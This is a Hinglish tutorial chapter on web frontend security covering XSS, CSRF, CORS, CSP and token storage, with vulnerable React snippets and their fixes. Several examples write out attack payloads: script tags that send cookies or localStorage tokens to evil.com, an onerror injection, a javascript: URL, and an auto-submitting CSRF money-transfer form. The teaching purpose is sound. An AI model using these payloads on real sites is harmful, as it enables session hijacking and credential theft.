# 12. Frontend Security — XSS, CSRF, CORS aur Beyond

Security ka chapter hai ye, aur seriously lena — because ye woh area hai jahan "it works on my machine" bilkul kaam nahi karta. Ek single missed sanitization call, ya ek galat cookie flag, aur production mein user data leak ho sakta hai. Is chapter mein hum web-specific vulnerabilities cover karenge jo React Native mein directly apply nahi hoti — XSS, CSRF, CORS — kyunki inka existence hi browser ke DOM aur cookie model pe depend karta hai. Phir hum token storage, dependency security, aur real-world gotchas pe aayenge, jinke RN equivalents tumne already companion handbook mein dekhe hain (SecureStore vs AsyncStorage, EXPO_PUBLIC_ vars, client-trust issues) — same underlying lesson, different environment.

Senior developer ke liye ye chapter itna important hai kyunki interview mein security questions almost guaranteed hote hain, aur production incidents mein "we didn't think about this" sabse expensive line hoti hai.

Ek mental model rakh lo shuru se: security bugs normal bugs se fundamentally different hain — normal bug se feature kaam nahi karta, security bug se **attacker ko power milta hai** jo unhe nahi milna chahiye tha. Isliye "it mostly works" security ke context mein acceptable nahi hai — ek edge case bhi enough hota hai exploit ke liye.

## Table of Contents

1. [XSS (Cross-Site Scripting) — The Core Web Vulnerability](#xss)
2. [Why React (Mostly) Protects You From XSS By Default](#react-xss-protection)
3. [CSRF (Cross-Site Request Forgery)](#csrf)
4. [CORS (Cross-Origin Resource Sharing) — What It Actually Is](#cors)
5. [Content Security Policy (CSP)](#csp)
6. [Secure Token Storage on Web — localStorage vs httpOnly Cookies](#token-storage)
7. [Dependency Security (brief)](#dependency-security)
8. [Real-World Gotchas](#gotchas)
9. [Key Takeaways](#key-takeaways)
10. [Interview Questions — Senior Frontend Developer](#interview-questions)

---

## 1. XSS (Cross-Site Scripting) — The Core Web Vulnerability {#xss}

XSS sabse fundamental web vulnerability hai, aur agar tumhe ek hi security concept deeply samajhna hai toh ye wahi hai. Core idea simple hai: **attacker apna JavaScript kisi doosre user ke browser mein execute karwa deta hai, tumhare trusted site ke context mein.**

"Context mein" ka matlab kya hai — jab attacker ka script `yourbank.com` pe run hota hai (na ki `evil.com` pe), toh us script ko wahi permissions milte hain jo `yourbank.com` ka legit JS code ke paas hote hain:

- Wo `document.cookie` read kar sakta hai (agar cookies httpOnly nahi hain)
- Wo authenticated API calls kar sakta hai, exact us user ki session ke saath
- Wo DOM manipulate kar sakta hai — fake login form dikha ke credentials steal kar sakta hai
- Wo localStorage se tokens nikaal sakta hai
- Wo user ke behalf pe actions perform kar sakta hai (jaise "transfer money" button click simulate karna)

Ye same-origin policy ko bypass nahi karta — balki ye same-origin policy ke andar hi, tumhare hi origin mein malicious code inject kar deta hai. Isliye ye itna dangerous hai.

> ⚠️ **DANGER:** XSS sirf "annoying popup" nahi hai. Real-world XSS attacks se session hijacking, credential theft, aur full account takeover ho sakta hai — kyunki attacker ka code literally tumhare trusted origin ke andar, tumhare user ki authenticated session ke saath run ho raha hota hai. Ek single unescaped user input field, pura app compromise kar sakta hai.

### Type 1 — Stored XSS

Yahan attacker ka malicious script tumhare **database mein permanently save ho jaata hai**, aur phir har user ko serve hota hai jo us page ko visit karta hai.

**Concrete scenario:** Tumhare blog pe comment section hai. Attacker ek comment post karta hai:

```html
<!-- attacker comment field mein ye submit karta hai -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
<!-- ye string database mein "comment_text" column mein save ho jaati hai -->
```

Agar tum ye comment baad mein render karte ho bina escape kiye (e.g. server-side template mein raw HTML insert), toh **har user jo us blog post ko dekhta hai**, unka browser silently us script ko run karega — aur unka cookie `evil.com` ko bhej dega. Ye sabse dangerous type hai kyunki ek hi injection se **saare visitors** affected hote hain, na ki sirf attack ka target.

### Type 2 — Reflected XSS

Yahan malicious script **request ka hi part hota hai** — typically URL query parameter mein — aur server usse unescaped response mein "reflect" kar deta hai.

**Concrete scenario:** Ek search page hai jo URL se query read karke page pe dikhata hai:

```
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

Agar server-side code `q` parameter ko directly HTML mein insert karta hai (`<p>Results for: ${q}</p>`) bina escape kiye, toh browser is script tag ko parse karke execute kar dega. Attacker ye malicious URL victim ko phishing email ya fake link ke through bhejta hai — victim click karta hai, aur unka apna browser attack execute kar deta hai. Ye "reflected" isliye kehlaata hai kyunki payload database mein store nahi hota — sirf ek single request-response cycle mein "bounce" hota hai.

### Type 3 — DOM-based XSS

Ye purely **client-side** vulnerability hai — server ka is se koi lena dena nahi. Vulnerability yahan hoti hai jab client-side JavaScript, untrusted data (jaise URL fragment, `location.hash`, ya user input) ko unsafely DOM mein inject kar deta hai — typically `innerHTML` ya similar APIs ke through.

**Concrete scenario:**

```js
// client-side JS jo URL hash se "name" parameter padhta hai
const params = new URLSearchParams(location.hash.slice(1));
const name = params.get("name");
// AND YE LINE VULNERABLE HAI:
document.getElementById("greeting").innerHTML = "Hello, " + name;
```

Attacker link bhejta hai: `https://example.com/#name=<img src=x onerror=alert(document.cookie)>` — server ko ye data kabhi dikhta hi nahi (hash fragment server ko bhejta hi nahi jaata), lekin client-side JS directly usse `innerHTML` mein daal deta hai, aur `onerror` handler fire ho jaata hai.

### Vulnerable React pattern aur fix

```jsx
// VULNERABLE — dangerouslySetInnerHTML ke saath raw user input, koi sanitization nahi
function CommentDisplay({ comment }) {
  // 'comment' ek user-submitted string hai, ho sakta hai <script> tags ya event handlers ho
  return (
    // dangerouslySetInnerHTML directly HTML string ko DOM mein inject karta hai
    // agar 'comment' mein malicious markup hai, browser use as-is parse/execute karega
    <div dangerouslySetInnerHTML={{ __html: comment }} />
  );
}
```

**Fix 1 — sanitization library use karo (jab rich text genuinely chahiye ho):**

```jsx
import DOMPurify from "dompurify";
// DOMPurify import kiya — ye ek battle-tested HTML sanitizer library hai

function CommentDisplay({ comment }) {
  // 'comment' user-submitted raw HTML string hai (e.g. rich text editor se aaya)
  const cleanHtml = DOMPurify.sanitize(comment);
  // DOMPurify.sanitize() dangerous tags (<script>, <iframe>) aur attributes (onerror, onclick) strip kar deta hai
  // bacha hua safe markup hi return hota hai — allowed tags ki whitelist ke basis pe
  return (
    // ab dangerouslySetInnerHTML ko sirf sanitized output milta hai, raw user input nahi
    <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />
  );
}
```

**Fix 2 — better approach, `dangerouslySetInnerHTML` avoid karo entirely (jab plain text hi chahiye):**

```jsx
// SAFE BY DEFAULT — koi dangerouslySetInnerHTML nahi, koi sanitization ki zaroorat nahi
function CommentDisplay({ comment }) {
  // 'comment' ek plain string hai, JSX expression ke through render ho rahi hai
  return (
    // {comment} React ke through render hota hai — React ise text node ke roop mein treat karta hai
    // agar comment mein "<script>" literal text ho, wo screen pe as literal text dikhega, execute nahi hoga
    <div>{comment}</div>
  );
}
```

Jab bhi possible ho, Fix 2 wala approach use karo — agar tumhe rich formatting (bold, links, etc.) chahiye hi nahi, plain text render karna hi sabse safe aur simplest solution hai. DOMPurify sirf tab use karo jab actual rich HTML render karna business requirement ho (e.g. markdown editor output, CMS content).

### Reflected XSS ka React example, defense-in-depth ke saath

Reflected XSS React apps mein bhi ho sakta hai agar tum manually query params ko parse karke unsafely render karte ho:

```jsx
import { useSearchParams } from "react-router-dom";
// react-router-dom se URL search params read karne ka hook import kiya

function SearchResults() {
  // URL se query params nikale — e.g. ?q=<script>...</script>
  const [searchParams] = useSearchParams();
  // 'q' parameter ki value nikali, jo attacker-controlled ho sakti hai
  const query = searchParams.get("q");

  return (
    <div>
      {/* SAFE — JSX expression, React automatically escape karega */}
      <p>Search results for: {query}</p>
      {/* agar yahan dangerouslySetInnerHTML use hota, ye vulnerable ho jaata */}
    </div>
  );
}
```

Notice karo — sirf JSX expression use karne se hi, bina kisi extra sanitization library ke, ye reflected XSS pattern already safe hai React mein. Yehi Section 2 ka core point hai — jab tak tum deliberately `dangerouslySetInnerHTML` use nahi karte, React ka default behavior tumhe already protect kar deta hai zyadatar cases mein.

---

## 2. Why React (Mostly) Protects You From XSS By Default {#react-xss-protection}

Ye ek genuinely important architectural fact hai jo bahut developers ko clearly nahi pata: **React automatically escape kar deta hai har wo value jo tum JSX expression (`{userInput}`) ke through render karte ho.** Ye kabhi bhi HTML ke roop mein interpret nahi hota by default.

```jsx
// user ne comment field mein ye submit kiya:
const userInput = "<script>alert('hacked')</script>";

function App() {
  // JSX yahan userInput ko render kar raha hai
  return <div>{userInput}</div>;
  // React iska output karega: &lt;script&gt;alert('hacked')&lt;/script&gt;
  // yani literal text jo screen pe dikhta hai "<script>alert('hacked')</script>" ke roop mein
  // browser is text ko HTML parse nahi karega, kyunki React ne pehle hi escape kar diya
}
```

React internally jab bhi tum `{value}` likhte ho JSX mein, wo value ko DOM text node ke roop mein set karta hai (`textContent` jaisa mechanism), na ki `innerHTML` jaisa. Text nodes browser dwara HTML ki tarah parse nahi hote — wo sirf literal characters hote hain. Isi mechanism ki wajah se JSX default behavior XSS-safe hota hai, bina tumhe kuch extra karna pade.

`dangerouslySetInnerHTML` ka naam itna deliberately scary hai isi wajah se — ye API explicitly React ke is default protection se **opt out** karta hai. Naam mein "dangerously" word React team ne intentionally daala hai, taaki developer code review karte waqt ya khud likhte waqt turant flag kare "wait, yahan kya ho raha hai, sanitization hui hai kya?" Ye ek deliberate API design choice hai — dangerous operations ko syntactically bhi dangerous dikhna chahiye.

> ⚠️ **DANGER:** `dangerouslySetInnerHTML` sirf tab use karo jab tumhe genuinely raw HTML render karna ho (jaise markdown-to-HTML output, ya CMS se aaya rich content), aur **hamesha** DOMPurify (ya equivalent) se sanitize karke. Kabhi bhi directly user input ya third-party API response ko is prop mein mat daalo without sanitization — chahe wo input "trusted" lag raha ho.

### Attributes bhi escape hote hain, sirf children nahi

Ek subtlety jo bahut developers miss karte hain — React sirf text content hi safe render nahi karta, attributes bhi. Lekin **kuch specific attributes** (jaise `href`, `src`) genuinely dangerous ho sakte hain agar unki value attacker-controlled ho, even bina `dangerouslySetInnerHTML` ke:

```jsx
function ProfileLink({ userProvidedUrl }) {
  // 'userProvidedUrl' user profile settings se aaya hai, ho sakta hai malicious
  return (
    // JSX attribute escaping XSS se bachata hai, lekin "javascript:" protocol scheme
    // se bachne ke liye ye tumhari khud ki zimmedari hai
    <a href={userProvidedUrl}>Visit profile</a>
    // agar userProvidedUrl = "javascript:alert(document.cookie)", ye click hone pe execute ho jaayega
  );
}
```

```jsx
function ProfileLink({ userProvidedUrl }) {
  // URL ko validate karo — sirf http/https protocols allow karo
  const isSafeUrl = /^https?:\/\//i.test(userProvidedUrl);
  // agar safe nahi hai, fallback ya '#' use karo, ya link hi mat dikhao
  const safeHref = isSafeUrl ? userProvidedUrl : "#";
  return <a href={safeHref}>Visit profile</a>;
}
```

Ye "protocol-relative XSS" ek chhota lekin real gotcha hai — React attribute injection se bachata hai, but `javascript:` scheme wale URLs ko block karna tumhara khud ka responsibility hai.

---

## 3. CSRF (Cross-Site Request Forgery) {#csrf}

CSRF ek completely different attack pattern hai XSS se — yahan attacker ko tumhare site pe koi code inject karne ki zaroorat nahi hai. Attack **malicious site pe** hota hai, aur exploit karta hai ek browser behavior ko: cookies domain-scoped hote hain, origin-scoped nahi.

### Attack kaise chalta hai

1. User `yourbank.com` pe login karta hai. Server ek session cookie set karta hai — `Set-Cookie: session=abc123`.
2. User (same browser session mein, without logging out) ek malicious site `evil.com` visit karta hai — ho sakta hai ek phishing email ke link se.
3. `evil.com` pe ek hidden, auto-submitting form hota hai jo `yourbank.com` ko target karta hai:

```html
<!-- evil.com ki page pe ye hidden form hai -->
<form action="https://yourbank.com/transfer-money" method="POST" id="csrf-form">
  <!-- form fields jo attacker chahta hai ki submit ho -->
  <input type="hidden" name="amount" value="10000" />
  <input type="hidden" name="toAccount" value="attacker-account-id" />
</form>
<script>
  // page load hote hi form ko automatically submit kar do, user ko pata bhi nahi chalega
  document.getElementById("csrf-form").submit();
</script>
```

4. Browser is form ko `yourbank.com` pe submit karta hai. **Crucial part:** browser automatically `yourbank.com` ke liye stored cookies (including session cookie) attach kar deta hai is request ke saath — chahe request kahin bhi se initiate hui ho, kyunki cookies domain-scoped hote hain, na ki "jis page se request bhej rahe ho" pe based.
5. `yourbank.com` ka server ko dikhta hai ek valid session cookie ke saath aayi request — server ke perspective se ye **exactly** waise dikhti hai jaise koi legitimate, logged-in user apne hi bank dashboard se transfer request bhej raha ho. Server ko koi idea nahi ki request actually `evil.com` se trigger hui thi.

Yahi CSRF ka core hai — attacker apna khud ka code tumhare site pe run nahi kar raha (XSS ki tarah), balki victim ke already-authenticated browser ko use kar raha hai apni behalf pe request bhejne ke liye.

### Defense 1 — SameSite Cookies

Modern browsers ek cookie attribute support karte hain jiska naam hai `SameSite`, jo browser ko batata hai ki cross-site requests pe cookie bhejna hai ya nahi.

```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

- **`SameSite=Strict`** — cookie **kabhi bhi** cross-site request ke saath nahi bheja jaayega, chahe user tumhare site ka link kisi doosre site pe click kare. Sabse secure, lekin UX thoda rough ho sakta hai (e.g. agar user email link se tumhare site pe aata hai, login state persist nahi hoga first navigation pe).
- **`SameSite=Lax`** (default in modern browsers) — cookie top-level navigation GET requests ke saath jaata hai (jaise link click karke aana), lekin cross-site POST requests (jaise upar wala form submit) ke saath **nahi** jaata. Zyada apps ke liye ye sweet spot hai.
- **`SameSite=None`** — cookie har jagah bheja jaata hai (old default behavior), aur isko `Secure` flag ke saath mandatory pair karna padta hai. Sirf tab use karo jab genuinely cross-site cookie sharing chahiye ho (rare legitimate use cases).

`SameSite=Strict` ya `Lax` set karne se, upar wala CSRF form-submit attack automatically fail ho jaata hai — browser cookie hi attach nahi karega, isliye server ko koi session hi nahi milega request ke saath, aur request unauthenticated ki tarah reject ho jaayegi. Ye largely CSRF problem ko **browser level pe** solve kar deta hai modern apps ke liye.

### Defense 2 — CSRF Tokens

SameSite cookies aane se pehle (aur legacy browser support ke liye) ye main defense tha, aur aaj bhi defense-in-depth ke roop mein use hota hai. Idea: server ek random, unpredictable token generate karta hai per session (ya per form), aur ye token tumhare **apne** forms/requests mein embed hota hai. Attacker ka cross-site request is token ko replicate/predict nahi kar sakta, isliye server request ko reject kar sakta hai jab token missing ya galat ho.

```js
// server side — login ke baad, session ke saath associated ek random CSRF token generate karo
const csrfToken = crypto.randomBytes(32).toString("hex");
// isko session store mein save karo (server-side), taaki baad mein verify kar sakein
session.csrfToken = csrfToken;
// aur is token ko client ko bhejo — e.g. HTML page mein embed karke, ya separate API response mein
res.render("transfer-form", { csrfToken });
```

```html
<!-- tumhare apne site ke form mein, hidden field ke roop mein token embed hota hai -->
<form action="/transfer-money" method="POST">
  <!-- ye token attacker ko pata nahi ho sakta, kyunki wo per-session random generate hota hai -->
  <input type="hidden" name="csrfToken" value="f3a9...(actual token yahan)" />
  <input type="text" name="amount" />
  <button type="submit">Transfer</button>
</form>
```

```js
// server side — jab transfer request aaye, token verify karo submit karne se pehle
app.post("/transfer-money", (req, res) => {
  // request body se aaya token nikalo
  const submittedToken = req.body.csrfToken;
  // session mein stored asli token se compare karo
  if (submittedToken !== req.session.csrfToken) {
    // agar match nahi hua, request ko reject karo — 403 Forbidden
    return res.status(403).send("Invalid CSRF token");
  }
  // token valid hai, tab hi actual transfer logic chalao
  processTransfer(req.body);
});
```

Attacker ka `evil.com` wala hidden form ye correct token nahi jaan sakta (kyunki wo har session ke liye unique aur random hota hai, aur cross-origin JS same-origin policy ki wajah se tumhare site se ye token read nahi kar sakta), isliye uski forged request reject ho jaati hai.

**Senior practice:** modern apps mein `SameSite=Lax/Strict` primary defense hoti hai, aur CSRF tokens ek extra defense-in-depth layer hote hain — especially sensitive operations (money transfer, password change) ke liye, jahan tum single point of failure pe depend nahi karna chahte.

---

## 4. CORS (Cross-Origin Resource Sharing) — What It Actually Is (Commonly Misunderstood) {#cors}

Ye topic sabse zyada confuse karta hai junior developers ko, isliye ise bahut clearly samjho. **CORS koi vulnerability nahi hai jise "fix" karna hai, aur ye primarily tumhare server ko protect karne wala mechanism bhi nahi hai.**

### Actual truth

CORS ek **browser-enforced restriction** hai, jo by default **users ko protect karta hai** — iska base rule kehlaata hai **Same-Origin Policy (SOP)**. SOP ka default behavior: JavaScript running on `siteA.com` **nahi** padh sakta responses jo `siteB.com` ne diye hain (chahe request successfully complete ho jaaye network level pe) — jab tak `siteB.com` explicitly permission na de.

Ye protection kis liye hai? Socho tum logged in ho `yourbank.com` pe (cookie set hai), aur tum ek doosri malicious site `evil.com` visit karte ho. Agar SOP na hota, toh `evil.com` ka JavaScript silently `fetch('https://yourbank.com/api/account-balance')` call kar sakta tha — browser automatically cookies attach kar deta (CSRF section jaisa hi mechanism) — aur `evil.com` response (tumhara account balance) **read** kar sakta tha JavaScript mein. SOP isi ko rokta hai — request ho sakti hai jaana, lekin response **read** karne ki permission cross-origin JS ko nahi hoti, jab tak server explicitly allow na kare.

**CORS headers** hi wo mechanism hain jinse ek server explicitly "opt in" karta hai — "haan, main allow karta hoon ki `otherorigin.com` se aayi JS meri response padh sake."

```
Access-Control-Allow-Origin: https://trusted-frontend.com
```

Ye header server bhejta hai apni response mein. Iska matlab: "sirf `trusted-frontend.com` se aane wala JavaScript mera response read kar sakta hai." Agar `evil.com` se same API ko call kiya jaaye, browser response ko silently block kar dega JS ke liye (chahe server ne response bhej diya ho network level pe).

### The extremely common junior confusion

> "Mujhe CORS error mil raha hai console mein, main isko client side pe kaise fix karoon?"

**Tum nahi kar sakte, aur karna hi nahi chahiye.** CORS error hamesha iska matlab hota hai ki server ne allow nahi kiya tumhare frontend origin ko response read karne ke liye. Isse fix karne ka **sirf ek** tarika hai: **server** apni response mein correct `Access-Control-Allow-Origin` header add kare.

```js
// SERVER-SIDE FIX (Express example) — ye client mein fix nahi hota, sirf server mein
app.use((req, res, next) => {
  // response mein header add karo jo batata hai kaunsa origin allowed hai
  res.setHeader("Access-Control-Allow-Origin", "https://your-frontend.com");
  // agar credentials (cookies) bhi bhejni hain cross-origin, ye header bhi chahiye
  res.setHeader("Access-Control-Allow-Credentials", "true");
  // request ko aage process karne do
  next();
});
```

Client side pe koi trick, koi header, koi library nahi hai jo CORS ko "bypass" kar sake — aur ye intentional hai, kyunki **whole point ye hai ki server decide kare kaun allowed hai**, client ko khud apna access decide karne nahi dena. Agar client-side se CORS bypass possible hota, toh SOP protection ka koi matlab hi nahi rehta.

(Dev environment mein log dekhte hain "just disable CORS in browser" jaisi hacky extensions — ye sirf local development ke liye theek hai, production mein iska koi role nahi hai, aur end user ke browser mein ye kaam nahi karega.)

### Cross-origin cookies ke saath fetch — dono taraf configuration chahiye

Agar tumhara frontend aur backend alag origins pe hain (e.g. `app.example.com` aur `api.example.com`), aur tumhe cookies (httpOnly session) bhejni hain cross-origin requests mein, **dono taraf** explicit configuration chahiye hoti hai:

```js
// CLIENT SIDE — fetch call mein credentials explicitly include karna zaroori hai
fetch("https://api.example.com/user/profile", {
  // 'include' batata hai browser ko: cross-origin request ho phir bhi cookies attach karo
  credentials: "include",
});
// bina iske, browser by default cross-origin requests mein cookies nahi bhejta
```

```js
// SERVER SIDE — Express example, cross-origin credentialed requests allow karna
app.use((req, res, next) => {
  // specific origin allow karo — wildcard '*' credentials ke saath kaam nahi karega
  res.setHeader("Access-Control-Allow-Origin", "https://app.example.com");
  // credentials (cookies) ko allow karna explicitly zaroori hai
  res.setHeader("Access-Control-Allow-Credentials", "true");
  next();
});
```

Dono taraf missing configuration hone pe request silently fail hoti hai — client ki `credentials: 'include'` ke bina cookie jaati nahi, aur server ki `Access-Control-Allow-Credentials` ke bina browser response ko block kar deta hai chahe server ne cookie set bhi ki ho.

### Preflight Requests

Kuch requests ko browser "non-simple" maanta hai (e.g. `Content-Type: application/json` ke saath POST, ya custom headers jaise `Authorization`). Aise requests ke liye, browser **actual request bhejne se pehle** automatically ek `OPTIONS` method wala request bhejta hai — isko **preflight request** kehte hain — jo server se poochta hai "agar main ye actual request bhejoon, kya tum allow karoge?"

```
OPTIONS /api/transfer HTTP/1.1
Origin: https://your-frontend.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

Server ko is preflight ka jawab dena hota hai correct CORS headers ke saath, batate hue kaunse methods/headers allowed hain:

```js
// server ko OPTIONS request ka response dena hoga, batate hue kya allowed hai
app.options("/api/transfer", (req, res) => {
  // kaunsa origin allowed hai
  res.setHeader("Access-Control-Allow-Origin", "https://your-frontend.com");
  // kaunse HTTP methods allowed hain actual request mein
  res.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
  // kaunse custom headers client bhej sakta hai
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
  // preflight ka response empty body ke saath 204 No Content hota hai
  res.sendStatus(204);
});
```

Sirf tab jab preflight successfully pass ho jaaye, browser actual request (POST wala) bhejta hai. Ye ek performance consideration bhi hai — har "non-simple" request effectively **do** network round-trips lete hain (OPTIONS + actual), isliye kuch teams preflight caching (`Access-Control-Max-Age` header) use karte hain taaki browser preflight result cache kar sake aur repeat na kare.

---

## 5. Content Security Policy (CSP) {#csp}

CSP ek response header hai jo browser ko **exactly** batata hai konse sources se scripts, styles, images, fonts, etc. load karna allowed hai. Ye XSS ke against **defense-in-depth** provide karta hai — matlab, agar somehow ek XSS vulnerability exist bhi kare tumhare code mein, CSP attacker ke injected script ko **execute hone se rok sakta hai** browser level pe.

**Concrete example:** socho attacker kisi tarah ye inject kar deta hai tumhare page mein:

```html
<script src="https://evil.com/steal-data.js"></script>
```

Agar tumhara CSP header hai `script-src 'self'`, browser is script tag ko dekhega, dekhega ki source `evil.com` hai (na ki tumhara apna origin), aur **script ko load/execute karne se refuse kar dega** — chahe HTML mein tag ho hi. Browser console mein CSP violation error dikhega, lekin attacker ka code kabhi run nahi hoga.

### Reasonably strict CSP header example

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://images.example.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

Directive by directive breakdown:

- **`default-src 'self'`** — fallback rule: jo directive explicitly specify nahi hui, uske liye sirf apna origin allowed hai.
- **`script-src 'self' https://trusted-cdn.com`** — scripts sirf apne origin se, aur ek specific trusted CDN se load ho sakte hain. Inline `<script>` tags (jaise attacker inject karega) by default block ho jaate hain jab tak `'unsafe-inline'` explicitly add na ho — jo tum generally **avoid** karna chahte ho.
- **`style-src 'self' 'unsafe-inline'`** — styles apne origin se, aur inline styles allow hain (kai apps ko inline styles chahiye hote hain, isliye ye kabhi kabhi zaroori compromise hota hai — ideally isse bhi avoid karo nonce-based approach se).
- **`img-src 'self' data: https://images.example.com`** — images apne origin, data URIs, aur ek specific image CDN se allowed hain.
- **`connect-src 'self' https://api.example.com`** — `fetch`/`XMLHttpRequest`/WebSocket calls sirf apne origin aur specified API ko allowed hain.
- **`frame-ancestors 'none'`** — koi bhi doosra site tumhare page ko `<iframe>` mein embed nahi kar sakta — clickjacking attacks ke against protection.
- **`base-uri 'self'`** — `<base>` tag ka href sirf apne origin tak restrict karta hai, jo relative URL hijacking attacks rokta hai.
- **`form-action 'self'`** — forms sirf apne origin ko submit ho sakte hain, cross-origin form submission (jaise CSRF attack scenario mein) rokne mein help karta hai.

> ⚠️ **DANGER:** CSP ko `Content-Security-Policy-Report-Only` header ke saath **pehle staging/monitoring mode mein test karo**, production mein directly strict CSP deploy karne se pehle. Agar CSP galat configure ho gaya (e.g. koi legit third-party script jo tumne allow nahi kiya), pura app functionality break ho sakta hai bina koi obvious error diye — sirf console mein CSP violation logs dikhenge.

### Report-Only mode aur violation monitoring

```
Content-Security-Policy-Report-Only:
  default-src 'self';
  report-uri https://your-monitoring-service.com/csp-violations;
```

- **`Content-Security-Policy-Report-Only`** — ye header actual policy ko **enforce nahi karta**, sirf violations ko log/report karta hai. Isse tum production traffic pe real data collect kar sakte ho ki kaunse legitimate resources block ho jaate, bina actually kuch break kiye.
- **`report-uri`** — jab bhi koi violation hoti hai (allowed nahi source se koi resource load hone ki koshish), browser automatically ek JSON report is URL pe POST kar deta hai. Isse tum production mein silently pata laga sakte ho ki policy kaafi strict hai ya nahi, aur bina user-facing breakage ke tune kar sakte ho.

Typical rollout flow: `Report-Only` mode mein kuch weeks chalao, violation reports monitor karo, policy ko refine karo (legit sources add karo jo missing the), phir confidently actual `Content-Security-Policy` header pe switch karo.

### Nonce-based inline scripts (jab inline script genuinely zaroori ho)

Kabhi kabhi tumhe genuinely ek inline `<script>` chahiye hota hai (e.g. server-rendered initial state). `'unsafe-inline'` use karne ki jagah, **nonce** approach zyada secure hai:

```
Content-Security-Policy: script-src 'self' 'nonce-r4nd0mBase64Value';
```

```html
<!-- server ne is exact request ke liye random nonce generate kiya aur script tag mein embed kiya -->
<script nonce="r4nd0mBase64Value">
  // ye script sirf isliye execute hoga kyunki nonce CSP header mein match karta hai
  window.__INITIAL_STATE__ = { user: null };
</script>
<!-- attacker ka injected <script> tag ke paas ye exact random nonce nahi hoga, isliye wo block ho jaayega -->
```

Har request ke liye server ek naya random nonce generate karta hai, isliye attacker predict nahi kar sakta aur apna script isi nonce ke saath inject nahi kar sakta — jabki `'unsafe-inline'` **saare** inline scripts ko blanket allow kar deta, including attacker ka injected wala.

---

## 6. Secure Token Storage on Web — localStorage vs httpOnly Cookies {#token-storage}

Ye genuinely debated topic hai senior engineers ke beech mein — dono approaches ke real trade-offs hain, isliye fairly cover karte hain.

### localStorage

```js
// login ke baad, token ko localStorage mein save karna
localStorage.setItem("authToken", token);
// baad mein, API calls mein use karna
fetch("/api/data", {
  headers: { Authorization: `Bearer ${localStorage.getItem("authToken")}` },
});
```

**Pros:**
- Simple to use, straightforward mental model
- Cross-origin API calls ke liye easy hai — token ko manually header mein attach kar sakte ho, koi cookie-domain complications nahi
- SPA architectures mein (especially jab backend aur frontend alag domains pe hain) kaafi common pattern hai

**Cons — genuinely serious risk:**
- `localStorage` **kisi bhi JavaScript ko** accessible hai jo page pe run ho raha hai — matlab, **koi bhi XSS vulnerability, kahin bhi tumhare site pe**, is token ko directly steal kar sakti hai:

```js
// agar site mein KAHIN BHI XSS vulnerability hai, attacker ka injected script ye kar sakta hai:
fetch("https://evil.com/steal?token=" + localStorage.getItem("authToken"));
// ye ek single line hai — koi complex exploit nahi chahiye, sirf ek XSS entry point
```

Isliye localStorage token theft ka risk directly proportional hai tumhare **entire codebase** mein kitni XSS surface area hai — chahe token khud kahin use ho ya na ho, agar site pe **kisi bhi** page pe XSS hai, token compromise ho sakta hai.

### httpOnly Cookies

```js
// server login response mein cookie set karta hai, JS involvement zero hai client side
res.cookie("authToken", token, {
  httpOnly: true, // JavaScript is cookie ko READ hi nahi kar sakti, chahe XSS ho jaaye
  secure: true, // sirf HTTPS connections pe cookie bheji jaayegi
  sameSite: "lax", // CSRF ke against baseline protection
});
```

**Pros:**
- `httpOnly` flag ka matlab hai **JavaScript is cookie ko kabhi read nahi kar sakti** — `document.cookie` mein ye dikhega hi nahi. Isliye even agar tumhare site pe XSS vulnerability exist kare, attacker ka injected script direct token nahi nikaal sakta.
- Browser automatically cookie ko relevant requests ke saath attach karta hai — manual token management ki zaroorat nahi.

**Cons:**
- Ab tum CSRF ke against exposed ho (jaisa Section 3 mein cover kiya) — kyunki cookie automatically attach hoti hai, chahe request kahin se bhi aayi ho. Isliye `SameSite` attribute aur/ya CSRF tokens **mandatory** ho jaate hain saath mein.
- Cross-origin API setups thode complex ho jaate hain — cookies by default cross-origin requests mein nahi jaatee jab tak `credentials: 'include'` (client side) aur `Access-Control-Allow-Credentials: true` + specific origin (server side, `*` nahi chal sakta credentials ke saath) properly configure na ho.

### Senior recommendation

Traditional web apps ke liye jahan frontend aur backend **same site** (ya subdomain) pe hain aur API calls same-site hain — **httpOnly cookies + SameSite + CSRF token protection** generally zyada security-conscious default hai. Reasoning: XSS bahut common hai (ek bhi missed sanitization enough hai), aur token theft ka blast radius (attacker ko permanent/long-lived access mil jaata hai, silently) CSRF ke blast radius se generally worse hota hai (jo per-action hota hai aur SameSite se largely mitigated ho jaata hai already).

localStorage tab justify hota hai jab tumhara architecture genuinely cross-origin hai (alag domains pe frontend/backend, jahan cookie sharing painful hota hai) aur tumhe token expiry/rotation pe strong control chahiye — but tab XSS defense (CSP, sanitization, avoid `dangerouslySetInnerHTML`) **extra rigorously** implement karna padta hai, kyunki wahi tumhari primary defense line hai.

> 🧠 **Senior Note — RN companion se connection:** RN handbook ke `04-expo-router.html` mein tumne yehi principle dekha tha `expo-secure-store` (Keychain/Keystore-backed, hardware-encrypted) vs `AsyncStorage` (plain unencrypted storage, arbitrary code se readable) ke context mein. Underlying lesson identical hai: **sensitive tokens ko arbitrary JS/app code se freely readable mat rakho.** Web mein ye distinction `httpOnly` cookie vs `localStorage` hai; mobile mein ye `SecureStore` vs `AsyncStorage` hai. Same principle, different runtime environment.

---

## 7. Dependency Security (brief) {#dependency-security}

Modern reality ye hai: real-world production apps mein zyada vulnerabilities tumhare **apne likhe hue code** mein nahi hoti — wo aati hain kisi **third-party npm package** se jo tumne install kiya, jiska code tumne kabhi padha bhi nahi. Har dependency ka matlab hai kisi doosre developer ka code, jo tumhare app ke **full trust aur permissions** ke saath run hota hai — same access jo tumhare khud ke code ko hai.

**Senior practices:**

```bash
# npm audit — installed dependencies mein known vulnerabilities check karta hai
npm audit
# specific vulnerabilities ko fix karne ki koshish karta hai (compatible versions upgrade karke)
npm audit fix
```

- **Dependabot / Renovate** — automated bots jo tumhare repo mein PRs create karte hain jab koi dependency ka newer (ya security-patched) version release hota hai. Inhe enable karna almost zero-cost hai aur ongoing maintenance burden significantly kam karta hai.
